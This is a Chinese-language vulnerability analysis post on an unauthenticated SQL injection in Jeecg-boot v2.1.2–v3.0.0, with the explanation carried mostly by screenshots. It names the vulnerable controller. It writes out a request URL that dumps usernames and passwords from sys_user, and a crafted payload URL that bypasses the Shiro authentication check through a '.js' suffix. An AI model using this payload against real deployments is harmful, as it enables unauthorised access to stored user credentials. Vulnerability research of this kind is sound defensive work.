

# Jeecg-boot v2.1.2-v3.0.0 后台未授权SQL注入漏洞 分析 - 先知社区

Jeecg-boot v2.1.2-v3.0.0 后台未授权SQL注入漏洞 分析

- - -

sangfor华东天勇战队[@pant0m](https://github.com/pant0m)  
源码位置： [https://github.com/jeecgboot/jeecg-boot/releases/tag/v3.0.0](https://github.com/jeecgboot/jeecg-boot/releases/tag/v3.0.0)  
sqli接口

漏洞点： src/main/java/org/jeecg/modules/ngalain/controller/NgAlainController.java

[![](assets/1703058957-d139ddf0d9c0aa4d851312fecd4cfff9.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231218203729-34fa68ce-9da2-1.png)

到达的mapper层的sql语句为

[![](assets/1703058957-46713a7bff7a0fdcdd3c32254738e551.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231218203736-3965662a-9da2-1.png)

也就证明可以控制sql语句  
[http://192.168.2.2:8081/jeecg-boot/sys/ng-alain/getDictItemsByTable/sys\_user/username/password](http://192.168.2.2:8081/jeecg-boot/sys/ng-alain/getDictItemsByTable/sys_user/username/password)

[![](assets/1703058957-6bd8a1c54cf3f8925fc11f852a5ee466.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231218203749-40b4676e-9da2-1.png)

未授权绕过

通过分析，整体框架使用jwt+shiro验证

[![](assets/1703058957-3aec2e9e75464989782aa00f3d4bea74.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231218203754-441a77f4-9da2-1.png)

但是通过分析发现

[![](assets/1703058957-834b7fc988f8c7288f6bb07c91727ab6.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231218203813-4f07f114-9da2-1.png)

此类的后缀接口是不需要权限校验的  
构造payload

SELECT \*, ' as "label",x.js as "value" from ' FROM sys\_user  
只需要构造如图的sql查询即可  
那么接口的请求即为

[http://192.168.2.2:8081/jeecg-boot//sys/ng-](http://192.168.2.2:8081/jeecg-boot//sys/ng-)  
alain/getDictItemsByTable/'%20from%20sys\_user/\*,%20'/x.js

[![](assets/1703058957-f4144476fb71fa8baa86287de52ec53e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231218203830-5937db72-9da2-1.png)
